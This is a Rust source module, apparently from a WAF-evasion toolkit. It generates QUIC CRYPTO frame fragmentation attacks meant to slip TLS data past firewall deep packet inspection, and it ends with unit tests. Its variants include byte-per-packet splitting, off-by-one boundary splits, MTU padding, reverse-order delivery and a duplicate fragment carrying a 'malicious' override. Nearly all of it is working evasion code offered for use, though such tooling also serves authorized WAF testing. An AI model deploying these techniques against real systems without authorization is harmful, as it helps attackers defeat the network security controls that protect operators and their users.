//! QUIC CRYPTO frame MTU fragmentation attacks.
//!
//! ## Attack surface
//!
//! QUIC's Initial packets carry TLS CRYPTO frames. Unlike TCP, UDP datagrams
//! are discrete — a QUIC endpoint can send packets at any size from 1200 bytes
//! (RFC 9000 §8.1 minimum MTU) up to the path MTU (typically 1500 bytes for
//! Ethernet).
//!
//! Some WAF DPI implementations:
//! 1. Reassemble QUIC CRYPTO frames only up to a fixed fragment count
//! 2. Have off-by-one errors in CRYPTO frame offset tracking
//! 3. Don't handle QUIC PADDING frames that artificially extend packet length
//!
//! By fragmenting QUIC CRYPTO frames at pathological sizes:
//! - **Below-threshold size**: Fragment at 1 byte per packet (WAF may skip
//!   reassembly for trivially small fragments)
//! - **Off-by-one boundaries**: Fragment at CRYPTO frame sizes that straddle
//!   WAF reassembly buffer boundaries (e.g., 1499 and 1 byte splits)
//! - **PADDING injection**: Pad packets to exactly 1500 bytes with PADDING
//!   frames to force WAF to handle maximum-MTU packets that contain very
//!   little actual CRYPTO data
//!
//! ## What we generate
//!
//! This module produces `QuicCryptoFragment` values — descriptions of how
//! to split a TLS ClientHello (or any CRYPTO data) across multiple QUIC
//! Initial packets. The wafrift transport layer uses these descriptors to
//! schedule actual packet sends.
//!
//! We also produce the raw QUIC CRYPTO frame bytes for each fragment, which
//! the caller embeds in a QUIC Initial packet.

use crate::{EvasionFrame, EvasionFrameSet, EvasionTechnique};

/// A single QUIC CRYPTO frame fragment.
///
/// QUIC CRYPTO frame format (RFC 9000 §19.6):
/// ```text
/// Type: 0x06 (1 byte)
/// Offset: QUIC varint (byte offset of this fragment in the TLS record)
/// Length: QUIC varint
/// Data: the TLS record bytes for this fragment
/// ```
#[derive(Debug, Clone)]
pub struct QuicCryptoFragment {
    /// Byte offset of this fragment in the full TLS record.
    pub offset: u64,
    /// Fragment data bytes.
    pub data: Vec<u8>,
    /// Whether to pad this QUIC packet to MTU with PADDING frames.
    pub pad_to_mtu: bool,
    /// Target MTU to pad to (if pad_to_mtu is true).
    pub mtu: usize,
}

impl QuicCryptoFragment {
    /// Encode as a QUIC CRYPTO frame (RFC 9000 §19.6).
    pub fn to_crypto_frame_bytes(&self) -> Vec<u8> {
        use crate::quic_cid::quic_varint;
        let mut buf = Vec::new();
        buf.push(0x06); // CRYPTO frame type
        buf.extend_from_slice(&quic_varint(self.offset));
        buf.extend_from_slice(&quic_varint(self.data.len() as u64));
        buf.extend_from_slice(&self.data);
        // Add PADDING frames (type 0x00) if requested.
        if self.pad_to_mtu && buf.len() < self.mtu {
            let pad_bytes = self.mtu - buf.len();
            buf.extend(std::iter::repeat(0x00u8).take(pad_bytes));
        }
        buf
    }
}

/// An MTU fragmentation attack descriptor.
#[derive(Debug, Clone)]
pub struct MtuFragmentationAttack {
    pub variant: MtuFragmentVariant,
    pub fragments: Vec<QuicCryptoFragment>,
    pub description: String,
}

/// Variant of the MTU fragmentation attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MtuFragmentVariant {
    /// Each byte of TLS data in a separate QUIC packet (maximum fragmentation).
    BytePerPacket,
    /// Fragments straddling the WAF's reassembly buffer boundary.
    OffByOneBoundary,
    /// Single fragment padded to exactly MTU bytes with PADDING frames.
    MtuPadded,
    /// Reverse-order delivery: last fragment sent first, first sent last.
    /// Some WAFs only inspect in-order fragments and miss out-of-order data.
    ReverseOrder,
    /// Duplicate fragment: same offset sent twice with different data.
    /// The server takes the first (legitimate) copy; a buggy WAF may use
    /// the second (malicious) copy.
    DuplicateFragment,
}

impl MtuFragmentationAttack {
    /// Build a byte-per-packet attack for `tls_data`.
    ///
    /// Each byte gets its own CRYPTO frame. Maximum fragmentation.
    /// Only practical for very small TLS records (e.g., a 10-byte test
    /// ClientHello for WAF fingerprinting probes).
    pub fn byte_per_packet(tls_data: &[u8]) -> Self {
        let fragments: Vec<QuicCryptoFragment> = tls_data
            .iter()
            .enumerate()
            .map(|(i, &b)| QuicCryptoFragment {
                offset: i as u64,
                data: vec![b],
                pad_to_mtu: false,
                mtu: 1500,
            })
            .collect();
        Self {
            variant: MtuFragmentVariant::BytePerPacket,
            fragments,
            description: format!(
                "MTU byte-per-packet: {} TLS bytes → {} QUIC packets",
                tls_data.len(),
                tls_data.len()
            ),
        }
    }

    /// Build an off-by-one boundary attack.
    ///
    /// Splits `tls_data` into chunks of `boundary - 1`, `boundary`, and
    /// `boundary + 1` bytes around the WAF's expected reassembly boundary.
    pub fn off_by_one(tls_data: &[u8], boundary: usize) -> Self {
        let mut fragments = Vec::new();
        let mut offset = 0usize;
        let split_sizes = [
            boundary.saturating_sub(1).max(1),
            boundary.min(tls_data.len()),
            boundary + 1,
        ];
        for &sz in &split_sizes {
            if offset >= tls_data.len() {
                break;
            }
            let end = (offset + sz).min(tls_data.len());
            let chunk = tls_data[offset..end].to_vec();
            let chunk_len = chunk.len();
            fragments.push(QuicCryptoFragment {
                offset: offset as u64,
                data: chunk,
                pad_to_mtu: false,
                mtu: 1500,
            });
            offset += chunk_len;
        }
        // Any remainder.
        if offset < tls_data.len() {
            let chunk = tls_data[offset..].to_vec();
            fragments.push(QuicCryptoFragment {
                offset: offset as u64,
                data: chunk,
                pad_to_mtu: false,
                mtu: 1500,
            });
        }
        let n_frags = fragments.len();
        Self {
            variant: MtuFragmentVariant::OffByOneBoundary,
            fragments,
            description: format!(
                "MTU off-by-one at boundary {}: {} bytes → {} fragments",
                boundary,
                tls_data.len(),
                n_frags
            ),
        }
    }

    /// Build a padded MTU attack.
    ///
    /// Sends `tls_data` in N equal-sized CRYPTO frames, each padded to
    /// `mtu` bytes with QUIC PADDING frames. Forces the WAF to handle
    /// maximum-size UDP datagrams with minimal CRYPTO content.
    pub fn mtu_padded(tls_data: &[u8], n_fragments: usize, mtu: usize) -> Self {
        let n = n_fragments.max(1);
        let chunk_size = (tls_data.len() + n - 1) / n;
        let fragments: Vec<QuicCryptoFragment> = tls_data
            .chunks(chunk_size.max(1))
            .enumerate()
            .map(|(i, chunk)| QuicCryptoFragment {
                offset: (i * chunk_size) as u64,
                data: chunk.to_vec(),
                pad_to_mtu: true,
                mtu,
            })
            .collect();
        let frag_count = fragments.len();
        Self {
            variant: MtuFragmentVariant::MtuPadded,
            fragments,
            description: format!(
                "MTU padded ({} bytes): {} bytes TLS → {} fragments each padded to {}",
                mtu,
                tls_data.len(),
                frag_count,
                mtu
            ),
        }
    }

    /// Build a reverse-order delivery attack.
    ///
    /// The fragments are in correct order in `self.fragments`, but the
    /// caller should send them in reverse order. WAFs that only inspect
    /// in-order CRYPTO data miss the TLS content.
    pub fn reverse_order(tls_data: &[u8], chunk_size: usize) -> Self {
        let sz = chunk_size.max(1);
        let mut frags: Vec<QuicCryptoFragment> = tls_data
            .chunks(sz)
            .enumerate()
            .map(|(i, chunk)| QuicCryptoFragment {
                offset: (i * sz) as u64,
                data: chunk.to_vec(),
                pad_to_mtu: false,
                mtu: 1500,
            })
            .collect();
        frags.reverse(); // Deliver last fragment first.
        let n = frags.len();
        Self {
            variant: MtuFragmentVariant::ReverseOrder,
            fragments: frags,
            description: format!(
                "MTU reverse-order: {} TLS bytes in {} fragments, sent last-first",
                tls_data.len(),
                n
            ),
        }
    }

    /// Build a duplicate-fragment attack.
    ///
    /// The first fragment is sent twice: once with the legitimate data
    /// and once with malicious data at the same offset. Many QUIC
    /// implementations accept the first copy (legitimate) and ignore
    /// the duplicate. A buggy WAF might process the second copy instead.
    pub fn duplicate_fragment(
        legitimate_data: &[u8],
        malicious_override: &[u8],
    ) -> Self {
        let normal = QuicCryptoFragment {
            offset: 0,
            data: legitimate_data.to_vec(),
            pad_to_mtu: false,
            mtu: 1500,
        };
        let dup = QuicCryptoFragment {
            offset: 0, // same offset = duplicate
            data: malicious_override[..legitimate_data.len().min(malicious_override.len())].to_vec(),
            pad_to_mtu: false,
            mtu: 1500,
        };
        Self {
            variant: MtuFragmentVariant::DuplicateFragment,
            fragments: vec![normal, dup],
            description: format!(
                "MTU duplicate fragment at offset 0: legitimate {} bytes + malicious {} bytes",
                legitimate_data.len(),
                malicious_override.len()
            ),
        }
    }

    /// Convert to an `EvasionFrameSet`.
    pub fn to_frame_set(&self) -> EvasionFrameSet {
        let frames: Vec<EvasionFrame> = self
            .fragments
            .iter()
            .enumerate()
            .map(|(i, frag)| EvasionFrame {
                bytes: frag.to_crypto_frame_bytes(),
                description: format!(
                    "QUIC CRYPTO fragment #{} offset={} len={} padded={}",
                    i,
                    frag.offset,
                    frag.data.len(),
                    frag.pad_to_mtu
                ),
                technique: EvasionTechnique::MtuFragmentation,
                stream_id: 0,
            })
            .collect();
        EvasionFrameSet {
            frames,
            technique: EvasionTechnique::MtuFragmentation,
            description: self.description.clone(),
        }
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_TLS: &[u8] = b"ClientHelloPayloadSimulation1234567890abcdefghij";

    // ── CRYPTO frame encoding ─────────────────────────────────────────────

    #[test]
    fn crypto_frame_type_is_0x06() {
        let frag = QuicCryptoFragment {
            offset: 0,
            data: vec![1, 2, 3],
            pad_to_mtu: false,
            mtu: 1500,
        };
        let bytes = frag.to_crypto_frame_bytes();
        assert_eq!(bytes[0], 0x06, "CRYPTO frame type must be 0x06");
    }

    #[test]
    fn crypto_frame_data_preserved() {
        let data = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let frag = QuicCryptoFragment {
            offset: 0,
            data: data.clone(),
            pad_to_mtu: false,
            mtu: 1500,
        };
        let bytes = frag.to_crypto_frame_bytes();
        // Find the data at the end (after type, offset varint, length varint).
        let tail = &bytes[bytes.len() - data.len()..];
        assert_eq!(tail, data.as_slice(), "CRYPTO frame must contain original data");
    }

    #[test]
    fn crypto_frame_padded_reaches_mtu() {
        let frag = QuicCryptoFragment {
            offset: 0,
            data: vec![1, 2, 3],
            pad_to_mtu: true,
            mtu: 100,
        };
        let bytes = frag.to_crypto_frame_bytes();
        assert_eq!(bytes.len(), 100, "padded frame must reach exactly MTU bytes");
    }

    #[test]
    fn crypto_frame_padding_bytes_are_zero() {
        let frag = QuicCryptoFragment {
            offset: 0,
            data: vec![0xFF],
            pad_to_mtu: true,
            mtu: 20,
        };
        let bytes = frag.to_crypto_frame_bytes();
        // Verify PADDING frames (0x00) at the end.
        // Type(1) + offset(1) + length(1) + data(1) = 4 bytes used; rest is padding.
        for &b in &bytes[4..] {
            assert_eq!(b, 0x00, "padding bytes must be 0x00 (QUIC PADDING frame)");
        }
    }

    // ── Byte-per-packet attack ────────────────────────────────────────────

    #[test]
    fn byte_per_packet_fragment_count() {
        let data = b"hello";
        let attack = MtuFragmentationAttack::byte_per_packet(data);
        assert_eq!(attack.fragments.len(), 5, "must produce one fragment per byte");
    }

    #[test]
    fn byte_per_packet_offsets_sequential() {
        let data = b"abcde";
        let attack = MtuFragmentationAttack::byte_per_packet(data);
        for (i, frag) in attack.fragments.iter().enumerate() {
            assert_eq!(frag.offset, i as u64, "offset must match byte position");
        }
    }

    #[test]
    fn byte_per_packet_data_single_bytes() {
        let data = b"xyz";
        let attack = MtuFragmentationAttack::byte_per_packet(data);
        for frag in &attack.fragments {
            assert_eq!(frag.data.len(), 1, "each fragment must be exactly 1 byte");
        }
    }

    #[test]
    fn byte_per_packet_data_content_preserved() {
        let data = b"abc";
        let attack = MtuFragmentationAttack::byte_per_packet(data);
        let reassembled: Vec<u8> = attack.fragments.iter().flat_map(|f| f.data.iter().copied()).collect();
        assert_eq!(reassembled, data);
    }

    // ── Off-by-one boundary attack ────────────────────────────────────────

    #[test]
    fn off_by_one_covers_all_data() {
        let attack = MtuFragmentationAttack::off_by_one(SAMPLE_TLS, 10);
        let reassembled: Vec<u8> = attack.fragments.iter().flat_map(|f| f.data.iter().copied()).collect();
        assert_eq!(reassembled, SAMPLE_TLS, "all data must be present when reassembled");
    }

    #[test]
    fn off_by_one_fragments_have_correct_offsets() {
        let data = b"0123456789abcdef";
        let attack = MtuFragmentationAttack::off_by_one(data, 5);
        let mut expected_offset = 0u64;
        for frag in &attack.fragments {
            assert_eq!(frag.offset, expected_offset, "fragment offset must be cumulative");
            expected_offset += frag.data.len() as u64;
        }
    }

    // ── MTU padded attack ─────────────────────────────────────────────────

    #[test]
    fn mtu_padded_all_frames_reach_mtu() {
        let attack = MtuFragmentationAttack::mtu_padded(SAMPLE_TLS, 3, 200);
        for frag in &attack.fragments {
            let bytes = frag.to_crypto_frame_bytes();
            assert_eq!(bytes.len(), 200, "padded frame must be exactly MTU bytes");
        }
    }

    #[test]
    fn mtu_padded_data_is_preserved() {
        let attack = MtuFragmentationAttack::mtu_padded(SAMPLE_TLS, 2, 200);
        let reassembled: Vec<u8> = attack.fragments.iter().flat_map(|f| f.data.iter().copied()).collect();
        assert_eq!(reassembled, SAMPLE_TLS);
    }

    // ── Reverse-order attack ──────────────────────────────────────────────

    #[test]
    fn reverse_order_fragments_are_reversed() {
        let data = b"0123456789";
        let attack = MtuFragmentationAttack::reverse_order(data, 3);
        // Last fragment (by offset) should be first in the vec.
        let offsets: Vec<u64> = attack.fragments.iter().map(|f| f.offset).collect();
        // Offsets should be decreasing (since we reversed).
        for i in 1..offsets.len() {
            assert!(
                offsets[i - 1] > offsets[i] || offsets[i - 1] == offsets[i],
                "reverse-order fragments must have decreasing offsets"
            );
        }
    }

    #[test]
    fn reverse_order_data_still_complete() {
        let data = b"hello world";
        let attack = MtuFragmentationAttack::reverse_order(data, 4);
        // Sort by offset to reassemble.
        let mut frags = attack.fragments.clone();
        frags.sort_by_key(|f| f.offset);
        let reassembled: Vec<u8> = frags.iter().flat_map(|f| f.data.iter().copied()).collect();
        assert_eq!(reassembled, data);
    }

    // ── Duplicate-fragment attack ─────────────────────────────────────────

    #[test]
    fn duplicate_fragment_has_two_fragments() {
        let attack = MtuFragmentationAttack::duplicate_fragment(b"legit", b"evil!");
        assert_eq!(attack.fragments.len(), 2, "must have exactly 2 fragments (original + dup)");
    }

    #[test]
    fn duplicate_fragment_both_at_offset_0() {
        let attack = MtuFragmentationAttack::duplicate_fragment(b"hello", b"world");
        assert_eq!(attack.fragments[0].offset, 0);
        assert_eq!(attack.fragments[1].offset, 0, "duplicate must be at same offset");
    }

    #[test]
    fn duplicate_fragment_data_differs() {
        let attack = MtuFragmentationAttack::duplicate_fragment(b"legit", b"evil!");
        assert_ne!(
            attack.fragments[0].data,
            attack.fragments[1].data,
            "original and duplicate must have different data"
        );
    }

    // ── to_frame_set ──────────────────────────────────────────────────────

    #[test]
    fn to_frame_set_technique_is_mtu_fragmentation() {
        let attack = MtuFragmentationAttack::byte_per_packet(b"x");
        let fs = attack.to_frame_set();
        assert_eq!(fs.technique, EvasionTechnique::MtuFragmentation);
    }

    #[test]
    fn to_frame_set_frame_count_matches() {
        let attack = MtuFragmentationAttack::byte_per_packet(b"abc");
        let fs = attack.to_frame_set();
        assert_eq!(fs.frames.len(), 3);
    }
}
